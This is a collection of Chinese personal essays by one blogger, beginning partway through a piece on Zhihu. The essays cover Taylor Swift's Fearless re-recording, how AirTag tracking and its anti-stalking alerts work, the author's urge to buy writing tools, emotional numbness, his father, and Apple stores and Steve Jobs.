上市后的知乎，会面临很大的发展阻力。其实，所有基于文字媒介的内容平台，都有发展瓶颈，即便是资源多到如头条，过去三年也差不多摸到了用户增长的天花板，1 亿多 DAU。这没什么办法，9 亿中国网民里，有一大半是根本不阅读的。

-

知乎可能无法成为巨头，成为巨头也不应该是知乎的目标。

早期周源老师曾说过，知乎的目标是做「小而美」的产品。在强者通吃的今天，这个词可能已经沾染了一点「酸」味，但我们仍可以尝试提炼它的精神内核。

9 年前，我是一个计算机学院的大一新生，如果不是因为知乎，我可能会和很多同学一样，认真泡实验室、图书馆，认真搞我的计算机视觉课题，出国读个研，尝试进大厂。从世俗层面来说，读计算机视觉然后进大厂当程序员，是比做媒体成功一万倍的路，是一个更标准的答案。

但我还是觉得，事情的关键不在于你「没走的那条路」，而在于你「选择了什么」。我选择了用 9 年时间在知乎上写 1038 个回答，并因此选择了去做评测、写报道，成为一个媒体人。

过程绝非一帆风顺，而是充满了挫败和挣扎，但坚持了 9 年之后，我还是懂得了接受它的缺憾，热爱它的美妙。在日复一日不完美的工作中，我也找到了做这一行的责任与使命。

就像 9 年前知乎邀请注册邮件里写的那样：

知乎是一个由大家共建的问答社区，这里也许没有标准答案。

期待知乎能继续秉承这一理念，在更大的未知世界里，不断寻找更适合自己的答案。
Source: 大破进击

**Taylor's Fearless**
Taylor's Fearless

We’re both young when I first saw you.

2009 年，我第一次听到 Love Story 的时候，它排在 Billboard Hot 100 单曲榜第四。那一周的冠军单曲是 Lady Gaga 的 Just Dance。

后者正是我心头所好。作为一个 14 岁初中生，我听了太多华语成人抒情，感到厌倦。我开始听叛逆的 pop punk、emo rock、接触 EDM，沉浸在它们营造的「keep partying」的氛围里。

那是一个灾难席卷而过，所有人只想逃避现实的年代，大部分流行歌都使劲聚焦于当下的狂欢，告诉你要忘掉过去，别担心未来。Ke$ha 和 Black Eyed Peas，把酒精、派对写成了流行音乐的时代注脚。

某种程度上，Taylor Swift 的确「不属于」那个时代。当所有主流孩子们都在狂欢中假装无忧无虑时，她把自己关在房间里，用钢琴和吉他写着自己的日记。

-

「日记」是 Taylor Swift 最核心的创作主题。

这一主题贯穿了她的整个创作生涯，从 Picture to Burn 到 All Too Well、Blank Space、Look What You Make Me Do……

第一张同名专辑里，她还带着一点「羞怯」，用了很多象征性元素作为表达介质。到 Fearless，她放开手脚，不惧一切地描写自己经历过的校园生活，直白且深入细节。

这些歌包含了与青春期恋情有关的一切元素：搭讪帅哥（Hey Stephen）、幻想童话般美好的爱情（Love Story）、幻想破灭（White Horse）、对初恋的表白（Fearless）、挖啦啦队长的墙角（You Belong With Me）、失恋的不同阶段（后半段的 5 首歌），和最终的「开悟」（Change）。

其中最具概括性的一首歌，是 Fifteen。她用回忆的视角，讲述了自己来到新学校，和 Abigail 成为 BFF，经历初恋，沉溺其中的故事。但青春期的感情不可避地迅速散佚，回顾这段经历，她展现了直面过去的勇气，前往更广阔未来的坚定。后来，Pitchfork 评价这首歌是「给青少年的心灵鸡汤」。

Love Story 和 You Belong With Me，作为两首热门单曲，奠定了 Fearless 的成功。包括我在内的很多人，也是通过这两首歌知道了 Taylor Swift。两首歌虽然用了 Teen Pop 风格的旋律，但写得并不滥俗，简单的短循环中，包含很多巧妙的变奏。经过十几年，听了几百遍，仍值得你回味。

Fearless 是 Taylor Swift 展现自己强大创作能力的开端，特别是写曲子的能力。毕竟这仍是一张被定义为「乡村」的专辑，制作上没有太多发挥空间，不像 1989 或 reputation。所以它代表了最纯粹版本的 Taylor。

2010 年，Fearless 获格莱美年度专辑。

-

我最初听 Fearless，听的是包含 6 首额外曲目的「白金唱片版」。那一版为了突出额外曲目，将它们排在了开端位置。所以很长一段时间里，我都以为 Jump Then Fall 是专辑的第一首歌。

这个曲序我并不喜欢，因为 Fearless 最核心的故事线，还是在最初的 13 首歌里，从同名单曲 Fearless 到 Change。相比之下，Taylor’s Version 在曲序上回归正常，这一点很棒。

抢先放出的 Love Story 里，Taylor Swift 尝试模仿了 12 年前自己的声线，编曲也调得与初版相似，效果近乎完美，让人甚至难以分辨新旧两个版本。我一度以为 Taylor Swift 是想精准复刻一个新版的 Fearless，彻底取代老版本。

但在专辑其他歌曲里，她并没有过分追求与初版的「形似」，而是接纳了乐器、录音环境和声线的自然变化，保留了时间的痕迹。包括这一次又新增的 6 首歌，乐器的质感明显贴合 folklore 和 evermore。

Fearless (Taylor’s Version) 之所以诞生，是因为她和之前的唱片公司 Big Machine Records 闹掰，失去了自己音乐的作品版权，只有通过重新录制，才能获得完整的唱片版权。

但也正是这样的重录，让 Taylor Swift 与过去的自己进行了一种跨越时间的交流，与经历过的一切挣扎和解。在新版 Fifteen 的 Lyric Video 里，Taylor 展示了她和 Abigail 当年的老照片，其中很多当然是「令人尴尬的丑照」，但她知道这段持续 16 年的友情更值得感激。

And Abigail gave everything she had to a boy who changed his mind we both cried - Fifteen, Fearless

Fearless，最初在歌词里是与男友在一起，感到无所畏惧。现在，这个专辑名显然有了更丰富的内涵。

这张专辑最终落地有 26 首歌，完整听一遍，就像走过 12 年那么长。中途必然有很多不愿提及的回忆，面对这一矛盾，Taylor 给出了一个更温柔、更平和的答案：

Cause no amount of freedom gets you clean. It’s a revolution, the time will come for us to finally win. She makes all of us feel things!

-

Fearless 发行的时候，Taylor Swift 差不多 20 岁，她在作品里描写的年龄段，正是我所经历的青春期。

12 年后，面对这张重录的 Fearless，我获得了一个身份互换的视角，也终于理解了其中蕴含的价值：如果你不敢直面过去，就永远无法真正成长。

12 年间，Taylor Swift 影响、激励了太多人。比如刚刚出道，年仅 18 岁的 Olivia Rodrigo，用 Lana Del Rey 的美学元素、Lorde 的声音技巧、唱了与 Taylor Swift 类似的青春期故事。

她在新歌里唱「watching reruns of glee」、「trading jackets like we used to」，你会感受到，有些东西正在被传承。

今天的我们，再重看 You Belong With Me 的 MV，会惊讶地发现，原来其中两个女生其实都是由 Taylor Swift 饰演。「酷」的啦啦队长、「怂」的书呆子，本质上是同一个人。

她陪伴了所有人的成长。这可能是过去 12 年里，我们能拥有的，最好的礼物。
Source: 大破进击

**Understanding AirTag**
Understanding AirTag

AirTag 是一个「有点难理解」的产品。

难理解，不是因为功能复杂：搞懂 AirTag 怎么用并不难。这是一个苹果产品，从你拆包装，到注册、查找，一切体验都经过精细设计，不会有什么障碍。

但想要理解 AirTag，你不只要「会用」。这是一个「追踪器」，与安全隐私息息相关，你必须弄明白 how it works，才能实现「物尽其用」，且保证自己不会暴露在安全隐患下。

过去几天，大家的 AirTags 陆续到货，我也看到很多朋友误解了 AirTag 的功能和性能。所以写这么一篇，尝试对它进行一个完整的解释。

-

AirTag 有两种追踪机制，远距离和近距离。

近距离：有效距离小于 100 米。通过蓝牙、UWB 进行连接。

近距离查找时，你的 iPhone 会通过蓝牙连接 AirTag，连上之后可以控制 AirTag 播放声音。在距离更近（实际测试至少小于 10 米）时，能建立 UWB 连接，精确测量 AirTag 和 iPhone 的距离和角度，实现「定向查找」。（UWB 仅 iPhone 11、12 系列支持）

远距离：理论有效距离无限。需要有其他开启网络、蓝牙、GPS 功能的苹果设备在周围。

当你的 AirTag 被丢在一个公共场所，它会被其他苹果设备（其实也就是 iPhone）嗅探到，这些设备嗅探到你的 AirTag 后，会获取自身的 GPS 位置，并上传到苹果服务器。然后你就可以在「查找」app 里看到 AirTag 的位置，过程是加密的。

⚠️ AirTag 连接到其他 iPhone 时，两者之间可能距离数十米，加上 GPS 定位的精度也不一定很高（特别是在室内）。所以 AirTag 远距离定位的精度最多也就是在 10 - 100 米。

所以「放一个 AirTag 在车里用来找车」是无效的。远距离定位精度不够且没必要，iOS 地图 app 本身就可以自动记录你停车的 GPS 位置。近距离追踪距离不够，需要你走到车旁边才能连上。

挂在宠物脖子上用来找宠物也是基本无效的使用场景。在户外，你无法用 AirTag 追踪移动的物体，因为 UWB 精确定位的距离极短，蓝牙则无法定位。除非你的猫经常躲在家里的某个角落让你找不到。

当然，买个 AirTag 刻个字，给猫猫狗狗当名牌。这个用法没什么问题。

-

AirTag 另一个需要理解的功能是「防追踪」。

简单来说，如果别人将一个 AirTag 偷偷放在你的身上、包里，试图追踪你的位置，苹果会想办法提醒你，让你能够阻断追踪。

「防追踪」功能的触发，至少需要两个条件：

AirTag 拥有者（的 iPhone）离开了这个 AirTag。 AirTag 的位置不断变化，且持续被同一 iPhone 探测到。

我测试了一下这个功能。朋友将他的 AirTag 放到我的包里。第一天晚上，我们在我家门口分开。第二天早上，我背着包去吃早餐、喝咖啡，中午回家，手机收到「发现有陌生 AirTag 正在与你一起移动」的通知。

在「查找」app 里，能看到这个 AirTag 第一次被检测到是什么时间，你带着它运动的轨迹，被记录的位置坐标点。

AirTag 离开主人 3 天后，会自动播放声音报警，尝试让周围的人发现它。所以被追踪者如果不是 iPhone 用户，就要等待 3 天，通过 AirTag 的报警声才能意识到自己被追踪。

这意味着：

AirTag 可以实现短时间的定位追踪，即便被追踪对象用的是 iPhone； AirTag 可以被「藏在丈夫/妻子的背包夹层里」，实现长时间的追踪； 如果把 AirTag 绑在车钥匙上，送去洗车、保养，不用担心 AirTag 报警，但如果是借车给朋友，则会有尴尬的隐患； 如果未来的 AirPods 内置类似功能，很可能会引发更复杂的问题。

必须要说，AirTag 追踪机制带来的安全问题，已经走到了一个非常危险的边缘。目前 AirTag 的体积还不算小，未来它如果变得更小更轻，安全问题还会继续加重。

苹果副总裁在接受采访时强调了「AirTag 的设计初衷是用来追踪物品，而不是人、宠物（等活的东西）」。

我认为，一旦 AirTag 出现任何安全问题的个案，苹果可能会推送软件更新，阻断移动状态下的位置追踪。AirTag 内置了加速计，实现这一点不难。

-

最后，AirTag 到底有什么用？

它最大的作用是「小范围找东西」：在你快迟到的时候，帮你找到床底下、沙发缝里的钥匙，某件脏衣服里的钱包……

其次，在善意主导的社会里，它可以帮你找到行李、背包、小提琴、相机、护照夹、票证夹、一把有纪念意义的伞……这不是一个你每天都会「用」的东西，它是一个「保险机制」，不一定 100% 可靠，但能给你提供一个挽救的可能性。
Source: 大破进击

**文豪病**
文豪病

新 iPad Pro 发售了。

从发布到开售的一个多星期里，我原本做了充足的心理建设，下定决心要买一台 iPad Pro 12.9’ (2021)。原因无他，它配备了全新的 Liquid Retina XDR Display。这样一块最新的、拥有多达 2596 个全阵列局部调光区的、HDR 峰值亮度能达到 1600 nit 的顶级屏幕，谁不想要呢？

但到了 4 月 30 日晚上，抢购开始的时候，我正和朋友在一桌干锅肥肠、金银蛋、咸蛋黄茄条、醋蒸鸡、擂辣椒皮蛋面前，吃得荡气回肠。尝试严控碳水摄入的我，和干了两大碗饭的我，已经不再是同一个我。我纯粹地，不再 care 什么 iPad Pro 的事。

直到一周后的今天，我才终于从五一假期的旋转、摇摆、intoxication 中醒过来，但首批 iPad Pro 早已被抢购一空，官网发货时效已经排到 7 月。我决定先不管了，没必要花一万多块钱，买一份两个月后才能兑现的承诺。

至少现在的我不会了。

-

我有一台 iPad Pro (2018)，你可能还记得当年我是怎么定义它的，我称之为「专业级业余」。

必须承认，拥有它的三年里，大部分时候我都没用到什么「生产力」，而是在「爱奇艺」，准确地说应该是 Netflix、YouTube 和 B 站。小部分时候，我用它干一件特简单的事：打字。作为一个职业写作者，这就是我的「生产力」。

单纯从「打字」这件事出发，iPad Pro 2018 和 2021 可以说没有任何区别。我的旧 iPad Pro 不仅 works perfectly fine，还更轻更薄。

但所谓「文豪病」就是这样，为了找到某种灵感迸发的感觉、进入某种心流的状态，作者总是不计成本的。这件事可以上溯到文房四宝的时代。

好文具和好文章之间从来没有任何因果关系，但只要有一丝可能，透过新体验，获得新灵感，写出新东西，买块新 iPad 又算什么呢？

-

我的「文豪病」最早可以追溯到初中时代。

每个学期伊始，我都要买一个周记本。那往往是开学第一天，半上午就放学，我可以在学校门口的文具店里千挑万选，选出几本「最好」的。我能摸出道林纸和其他普通纸的差别。当然，区别其实早已体现在价格上。

今天再翻看它们，每个学期开头的两三篇周记，总是写得最认真的，无论是文字质量，还是更直观的书写态度。它们还有一个共同点：每个本子都最多只写到一半，后面就只剩下历经时间洗礼的，发黄的空白。

而在抽屉的深处，有更多的本子，上面一个字都没写过。

高中毕业之后，我买了更多、更贵的本子和笔。有几本 Moleskine，在我看来它们华而不实；也有一本 Leuchtturm1917，被我带着走过好几个城市、国家；最后让我满意的，是日本的 Modori。因为我喜欢用三菱的水笔而不是中性笔，欧洲那些为油性、中性笔设计的笔记本，多少都有点洇墨，Modori 不会。

再后来，键盘取代笔，成为我最重要的创作工具。

我也买过很多键盘，尝试过各种不同的轴体，最后发现 Cherry 红轴是最适合自己的，所以买了一把最好的 Filco。其实如果算细账，1600 块钱一把的 Filco 并不算贵，保养得当的情况下，可以用上 10 年。iPad Pro 的那个 2700 块的妙控键盘显然用不了这么久。

除了键盘，一切和创作有关的事情，都能成为「文豪病」的载体。

比如要价 40 美元一年的 Ulysses，我很难说清楚它与其他 Markdown 文本编辑器有什么本质区别。无非是简洁、美观、有条理一点，跨设备体验连贯一点，运行还算稳定，能满足我的需要。最重要的是，我喜欢。

继续往深处延展，「文豪病」可以与生活的每个细节息息相关，一杯咖啡、一把椅子、一块显示屏、一套房子、一次以创作为目的的旅行、甚至一场恋爱。

-

写这篇文章，不是要自我反省。

「文豪病」是我的人性弱点，但我并不觉得这有什么大不了。就像我晚上睡不着、早上起不来、时常拖稿、偶尔崩溃、永远长不大、喝冷牛奶会放屁一样。我逐渐学会用一种更温柔的 approach，去包容自己的弱点。

所谓「人类」，不就是一种有缺憾的造物吗？

这些事情讲起来，一定有人会觉得「凡尔赛」，整个论述也充满了消费主义的味道。请注意，我不是在教你做任何事。每个人都值得成为自己。

答案就是在空中飘来荡去的。在 4 月 30 日那天，可能存在着不只一个平行宇宙。其中一个我，抢到一台首发 iPad Pro，「文豪欲」得到满足，很润滑地写出几篇文章；另一个我，即使买了 iPad Pro，也没搞出什么新东西。

但真正关键的，还是眼下这个我。我吃了一顿好饭，睡了个好觉，完全忘了 iPad Pro，度过了快乐的假期。未来几周，我或许还是会买一个 iPad Pro，或许不会。但这都不重要，我不需要太多计划，对事情抱太高预期。

有趣的是，这种松弛与狂气，反而让我有了一点灵感。我只花很短的时间就写完了这篇文章。它归属于一个更大的人生母题，自我接纳与认可。

当你成为自己的时候，你会放松。放松的时候，一切就会变得很自然。
Source: 大破进击

**情感模块维修技术**
情感模块维修技术

有那么一段时间，我失去了「哭」这个功能。

一切好像是从去看《天气之子》开始的。积了一肚子压力的我，迫切地期待一场大哭作为排解。新海诚自然是很好的选择，你甚至可以说他把催泪这件事工业化了。但当我从电影院里走出来，眼睛竟然是异常干燥的。

我认为是电影本身的问题，因为就在几个月前，我的泪腺还很正常。我去看《玩具总动员4》，从开头迪士尼的蒸汽火车呜呜开进来，一直哭到散场，回家的路上，听着《You‘ve Got a Friend in Me》，倾盆大雨下在没有雨刮器的眼眶里。

后来，我才逐渐意识到，是自己出了问题。

-

对我来说，为虚构作品哭，一直是非常简单的一件事。

其中有一些具体的瞬间，比如解放米法的那一夜、通关《马里奥奥德赛》里世界的那一刻。以及那些令人印象深刻的片段：鹿丸带着几个下忍去追佐助，路上遭遇音忍四人众，每个人都在绝境下发掘了新的自己；《摩登家庭》第一季结尾，Jay 说起自己如何感激家人的不完美……

当这件事发展成「看迪士尼、任天堂的广告都会情绪翻腾」时，我意识到一切的根源是童年的某种缺失。但我也乐于将它当作一种情绪上的 coping mechanism，一种逃避现实的有效方式。特别是成年后，我时常通过这种方式，把自己的泪腺「打开」一下。

将眼泪诉诸于作品，是一种很安全的做法。你不需要它们回应你，它们也无法回应你。你就像一只具有「自我清洁」功能的烤箱一样，每过一段时间就用这种方式，把自己洗干净一次。

这样做当然有副作用，很快，我对现实的感觉开始变得越来越淡。起初我还觉得这是自己能够「控制好情绪」的表现，但事情没那么简单。我已经不记得上一次跟别人吵架是什么时候，不记得真正为一件事真正感到开心是什么时候。

同样消失的，还有爱的能力。

-

新冠时代更是加剧了这一切。

将对虚构作品的感情，平移至现实的最有效方法，莫过于「圣地巡礼」。所以我玩过《P5》后，立刻去涩谷感受了东京的日与夜。站在那个著名的交差点，我与自己曾扮演的 Joker 也进行了一次「交叉」。现在，这件事已经做不到了。

去年我们说「Covid-19 让一些东西彻底改变了」，到现在，你完全可以说，我们已经走入了一条没人想象过的世界线，而且完全不知道未来会怎样。那些曾经的切身体验与日流失，现实世界更是逐渐干涸，我感到 dead inside。

所以当我读到池骋老师的作品时，它们就像一连串 wake-up call，狠狠敲在我的头上。

她写了自己从游戏中「寻找安全感」的尝试：

一遇到什么过不去的问题，我就总想找到这些人，总想回到这些地方。而你一旦有了想要见到的人和想要回去的地方，你伤心的时候就快要到了。生活就是这样。

她写了与作品的一期一会。

不久以后我就会忘记很多关于《P5》的细节……可是我会记得情绪……我记得我的喜极而泣，以及几乎在同一时间将我击垮了的怅惘和遗憾。

等到回过神来，我能做的事情只剩下告别——

是的，这种事以后多着呢。

以及她写了，「全情投入的爱」：

但你知道吗，爱游戏就像爱人，那些面上的品质是你爱上一个游戏或者一个人的既不充分也不必要条件。

全情投入是困难的，并且这是一个随着你的生活经验逐渐增长而难以回返的过程。正因为如此，能够投入地去爱，无论是爱一个游戏还是爱一个人，都是一种了不起的本事——或许是人类最了不起的本事也说不定。

我突然意识到，问题并不在于你将情感诉诸给了什么，而是在于你到底敢不敢承认：那些感觉、心情，确切地存在过。无论是与虚构作品的共鸣，还是那些更真实的，生活中的情感体验。

某层窗户纸被捅破，我终于又可以哭了。上周的某一天，我坐在车里，一边听《荒野之息》里「一始村」的音乐，眼泪像湖水决堤一样漫出来。

-

我回想起 2017 年，自己玩《P5》的那个夏天。

那个 5 月，我刚刚离职。没有人找我，没有领导、甲方、编辑、运营老师……

我沉浸在《P5》描绘的东京里。特别是大结局前的两个通宵，我坐在屏幕前面，几乎是边玩边哭，那是认真投入过后的喜极而泣，是温暖，是欣慰，也是知道这段故事即将结束的怅然若失。所谓 bittersweet，说的就是这种感觉吧。

其实我很清楚，这些眼泪并不只是为《P5》而流，它们是游戏故事与现实经历互文的结果。结尾他们开着猫巴士，上了一条海边的高速路，杏惊呼「うみ！」，这个桥段一下就唤起了我的某种 deja vu。曾经的我羞于面对这一点，但这就是事实。

一切都是真的，就像你经历的每一段单纯或复杂的情感体验一样，你哭过了、笑过了、付出过了、得到过了，才算是真的「活过」，它们塑造了你，让你成为真正的自己，一个更完整的人。

鲁迅说（这句话真是鲁迅说的）：人类的悲欢并不相通。但实际上，它们是相通的，不仅人与人之间的情感相通——万事万物都彼此相通。
Source: 大破进击

**我的父亲**
我的父亲

对我的大脑皮层来说，「回忆父亲」是一个有点陌生的任务。

我能想到的第一个词是「严父」。二三年级的某个暑假，他拿出一本《古诗 300 首》要求我背。其中第一首乐府诗，共有十句。 这对当时最多只背过七言绝句的我来说，太难了。实际上，这首诗是初二语文课本内容。

我一点都不想背，坐在我房里的小沙发上，心思已经飘到了窗户外面。等到快吃饭的时候，我还是只能背出两句。父亲一怒之下，将锅铲摔到地上。十分钟后，我背出了这首诗。

直到今天，这首诗都停留在我记忆的主干道上，可以信手拈来。它的最后两句是「少壮不努力，老大徒伤悲」，高度概括了父亲对我的要求和期许。

-

在我的童年视角里，父亲是一个顽固而暴躁的人。我们之间的亲子关系并不好，「逃离家庭」是我青春期的重要主题。

他几乎从未在我面前展现过感性和温柔的一面，大部分时间都在对我提要求。当我和其他人起矛盾的时候，他从不护短，甚至很少站在我这一边。当我的表现与他的期待相去甚远时，他也会将问题诉诸暴力。

他有一套金庸全集。初中时期，当我拿起这套书开始看时，妈妈跑过去兴高采烈地告诉他，意思是「你儿子正在成为你」。但他可能觉得读闲书这件事并不值得鼓励，直到今天，他也从未跟我谈到过哪怕一次金庸。

从小到大，他从不主动给我过生日，我也从未祝他生日快乐。虽然我知道他的生日是哪天：为注册网游账号，我背下了他的身份证号码。

他又冷又硬的态度，塑造了差不多性格的我。在他几次离家，去国外工作的那段时间里，他很少要求我接电话，我也从不主动要求听电话。

我一直极力抵抗自己从他身上继承了什么东西的事实。他抽烟酗酒，不在意任何生活细节，我恰好相反。当有人说我长得像爸爸，我会说，「是吗？别人都说我长得像妈妈一点。」

但无论如何，我身上仍有一半基因来自他。

他极为理性，也常常能看清楚事情的真相。当年掀起全民「养生热」的时候，他最早就对「吃红薯治百病」的说法不屑一顾。他想问题的速度很快，且从不给自己设限制。他不奉承巴结任何人，永远在埋头干自己的事。这些特质，我和他一模一样。

偶尔我做好了一件事，他的朋友，那些叔叔们会称赞，「你也不看看这是谁的儿子。」

-

父亲从不示弱。

在我的印象里，他好像从未感冒过。偶尔身上出现一些皮外伤，他连创可贴都不贴，从来都是咬咬牙等伤口自己愈合。

我也复刻了这一性格。小时候哮喘严重，晚上睡不着，我就一个人坐在床上哭，但不哭出声。大学有一次发高烧，我自己抱着一瓶冷水缩进被子硬抗，都没想过让室友帮忙倒杯热水。再之后，我一个人挤地铁去看心理医生，回来之后贴着抱枕睡觉。这一切，我从未跟他说过。

但也正是这些经历，让我明白，一个人不示弱，并不代表永远刀枪不入。当我意识到这一点的时候，已经晚了。

从高中开始，我的梦想一直是去美国留学。刚进大学的时候，父亲会要求说「能拿到奖学金你就去」，当时的我并不知道「他再次选择去非洲工作，是为我赚学费」。当然，他可能也不知道，我最终放弃留学，很大一部分原因是出于经济条件的考量。

他一边说「到 18 岁就不养你了」，一边赚钱给我买房子。一边说「装修的问题你自己解决」，一边还是决定，最后再出国干一年。

2018 年，原本已经准备就留在家里工作的他，决定最后一次去非洲工作。走之前，他给了我 1000 美元现金。说，「你想去美国玩，就把这个拿去用吧。还有美元在你妈妈那里，到时候你找她要。」

而那段西海岸的旅行，某种程度上，成为我无忧无虑青春期的最终华彩。

-

2019 年，父亲回来，立即确诊重病。

这个家的结构突然回到了 20 年前的状态，还是母亲照顾一个病人，另一个男人去赚钱。只是角色上，我们镜面反转。

也差不多就是从那个时候开始，我开始以前所未有的干劲，埋头赚钱。两年里，我几乎没有拒绝过任何一个工作上的邀约，有活就接，通宵达旦也把它们干完。两年之后，我的收入相比 2019 年翻了三倍，填上了家庭收入的那个「坑」。

我以为这会带来一种宽慰，毕竟无论在我们父子之间的语境里，还是主流世界的讨论中，钱都是能解决一切问题的万能等价交换物。

但实际上，事情并不是这样。那些随时间流走，不再回返的心情，才是最关键的。缺失的东西，就永远缺失在那里。

像一条精准的铁律：父亲以前能做好的事情，比如赚钱，我依然能做好；而他做不好的事，比如共情与爱，我依然做不到。

我一度陷入一种钝感的痛苦，特别是随着疫情持续，我和很多人的连接，都因空间的封锁，变得越来越微弱。父亲也是一样。2017 年抑郁时期的那种状态，似乎重新席卷而来。

我的内心确实变强大了，不断调整，努力维持着自己的稳态，包括接受「他的病已经无法医治」这个事实。

-

2018 年，父亲患病之前，向我提出的最后一个要求是：「自己赚钱把房子装修了」。

这件事在当时看来，几乎不可能，我也认为他只是在夸大其词而已。但之后，这件事变得越来越真实。

我用两年时间攒够了这笔钱，或许以他的标准，这就叫「长大成人」吧。虽然我其实一点都不想长大。

我最后一次达到了他的「要求」，他也不会再向我提要求。

如果说我从这段亲子关系里学到了什么，那就是自己的身体健康，和重要的人度过有质量、有意义的时光，比什么狗屁成绩、职位、收入，都重要的多，你必须自己照顾好自己。

未来我可能会成为一个更完整的自己，虽然父亲的缺失也就永远在那里。

但这就是生活。
Source: 大破进击

**Apple 长沙：The wait is over**
Apple 长沙：The wait is over

2008 年，北京奥运会开幕前夕，苹果在中国大陆的第一家直营零售店，Apple 三里屯开业。

那时 iPhone 问世刚满一年，苹果全线产品的销量都在飞速增长，供不应求。「去 Apple Store 彻夜排队」成为一种潮流。

开业前夜，一批年轻的 Apple 支持者，来到三里屯，见证国内第一家直营店的开幕。当时还在经济观察报当记者的林嘉澍，用一台 DV 记录下了整个过程。今天再看这个视频，你能听到很多熟悉的名字。

隔着屏幕，不难感受到一种娇憨，同时又勃勃向上的生机感。2008，多灾多难，但未来仍然充满了可能性。后来知乎上有人回忆当年，说：那时人人走路都带着风，眼睛里都有光。

-

我第一次去 Apple Store 是 2012 年，香港的 Apple ifc mall。

第一反应当然是震撼。半透明的台阶，曲面的玻璃护栏，被金属把手严丝合缝地连接起来，楼梯盘旋而上。透过巨大的玻璃幕墙，你能俯瞰中环如潮水般车流。

有人会将 Apple Store 的建筑风格与「宗教」联系起来，认为它是当代商品拜物教与资本结合后的造出的一种「神迹」。与那些追求极致的苹果产品一样，它是人类当代设计和工业最高水准的结晶。

一切可以追溯到 2006 年，史蒂夫·乔布斯获得一个机会，在纽约第五大道上开一家Apple「旗舰店」。

他拿到一块有点鸡肋的「空间」：通用大厦门前，不大不小的一块广场。很难在上面造一个独立的空间，只能把店安排在负一层。而商业地产的负一层，是大部分高端品牌避之不及的「坟墓」。

乔布斯想到一个疯狂的想法，在广场上放一个巨大的「玻璃盒子」，作为 Apple Store 的入口。然后，他真的就在那里放了一个玻璃盒子。

2006 年，Apple Fifth Avenue，苹果第一家「永不打烊」的旗舰店开业。乔布斯亲自在门口迎接了第一位顾客，那个镶嵌着苹果 Logo 的玻璃盒子，也成为第五大道，甚至纽约的地标之一。

最初，盒子由 90 片玻璃组成。之后随着技术迭代，这个数字被减少到 18 块，使它变得更加简洁、纯粹。那些巨型玻璃的采购价格，也一度成为坊间传说。

Apple Fifth Avenue 开业后的十几年间，苹果在全球复刻了几百家风格类似，极具未来感的直营店，包括 Apple 三里屯 和 Apple ifc mall……

-

2017 年，苹果新总部 Apple Park 落成。这艘由乔布斯亲自规划、敲定蓝图的「宇宙飞船」，是苹果在建筑上的巅峰之作。它有一扇四层楼高，由整块玻璃组成的巨大玻璃门，无疑也是在致敬乔布斯创造的「神迹」。

当时 WIRED 杂志记者 Steven Levy 问设计师 Jony Ive，为什么苹果需要一扇如此巨大的玻璃门，后者回答：「这得取决于你怎么定义『需要』，对吧？」

建筑风格上，Apple Store 采用了极简设计，但功能上，它绝不只是一家「零售店」这么简单。它是苹果最好的「广告看板」，品牌象征，也是城市地标，一种更复杂的公共空间。

同样是在 2017 年，当时负责零售的高级副总裁，Angela Ahrendts 宣布，Apple Store 将在风格定位上转型。新风格被命名为「Town Squares」，内部装潢在保持简洁的基础上，引入了更多木质元素和绿植，让空间变得更温馨，更有生机，也采用了更多环保设计。

自 2012 年 Apple ifc mall 之后，我又去过了几十家直营店。更重要的是，经由苹果用户社群，我认识了很多新朋友。每到一个新城市，基本都会和新朋友见面交流。碰头的地点，自然选在 Apple Store。

从 Apple ifc mall 到三里屯，南京东路、天河广场、解放碑，再到 Apple 表参道、涉谷、Infinite Loop……

说 Apple 改变了我的人生可能有点夸张，但 Apple 的产品、理念、社群，的确成为了我过去十年工作、生活的重要组成部分，漫长旅途中，Apple Store 成为线下的一系列关键「点」。

-

2017 年，Apple 在家乡长沙开店的计划上马，当时我刚刚离开北京回家。因此消息，也认识了好几个长沙 Apple 用户社群的新朋友。之后近 4 年，消息一度沉寂，直到去年末，项目正式启动。

不难想象，过程中充满了各种困难和阻力。但无论如何，the wait is over。2021 年 9 月 4 日，Apple 长沙开业。开业庆典上，我又见到了几个新朋友，同事。

Apple 三里屯开业十几年后，那些见证了第一家直营店开业的「果粉」们，在各行各业，都做出了斐然成绩。就像乔布斯当年所说，connecting the dots 这件事无法「被规划」，你只有经历过，回头去看，才能看到那条由离散的星星点点连起来的，一条完整的路。

站在 2021 年的今天，未来充满未知，但我相信这会是一个「点」，我们从此开端。
Source: 大破进击

**没有史蒂夫·乔布斯的世界**
没有史蒂夫·乔布斯的世界

2011 年 10 月 6 日，我平常地走入这一天。

我平常地上学，睡过一节英语课。一边跟同桌讲小话，一边等待打铃。黑板旁边的高考倒计时牌如果准确，应该写着 245 天，但我肯定记不清了。

午休之后，我平常地戴着耳机，揉着惺忪睡眼去学校。根据 iTunes 的记录，我当时听的歌，有相当概率是 Maroon 5 的 Moves Like Jagger，我也记不清了。

就在去学校的路上，我从同学那里听到消息：「乔布斯死了」。

大脑里掌管记忆的神经元们，开始激烈涌动。像胶片曝光一样，我捕获了那个瞬间：午后阳光透过树叶，逆着照进眼睛。我甚至记得当时空气的质感，凉得清脆。

从那天起，我们活在一个「没有史蒂夫·乔布斯的世界」。

-

我跟史蒂夫·乔布斯并不熟。

即使根据著名的「六度分隔」理论，2011 年的我，也大概率无法通过 6 个人，就「链接」到他。

我喜欢他的音乐播放器，iPod。仅此而已。

当时我经常兴奋地与同桌讨论，毕业后要买什么新手机。但我的关注点，主要在两个行业巨头，诺基亚和微软身上。

它们强强联合，即将推出一款名为 Lumia 的 Windows Phone 智能手机。我觉得那会是手机的未来。

不久，Walter Issacson 写的那本《乔布斯传》出版。

有同学买来这本书开始读，但我有点不屑一顾。这本书，连同乔布斯这个人一起，似乎都带着一股「成功学」的味。创新之「神」？我不相信这个世界上有什么神。

这当然只是我无知的观点。乔布斯的一生，和「成功学」毫不沾边。他是 60 年代「反文化运动」中的嬉皮士先锋，「财富」从来不是他关心的事。

中文版《乔布斯传》由中信出版社出版。当时的我不会知道，负责组织翻译《乔布斯传》的那个人，将在 5 年后，改变我的人生轨迹。

这是后话。

-

更快的「改变」，发生在 2012 年夏天。

我拥有了自己的第一台 iPhone，一台 iPhone 4S。

买 iPhone 完全是出于从众。我的朋友们，几乎清一色用着 iPhone 4，我想跟他们互发蓝色气泡的 iMessage。

以及，在那块「Retina 屏幕」上，用手指一下切开 6 个水果，确实奇妙。

但这些都不重要了，重要的是，我选择了 iPhone。

2012 年 8 月 1 日，那一天成为了我 iCloud 照片流的「开端」。至今 9 年多时间里，我用了 7 台不同的 iPhone，从未「反悔」。

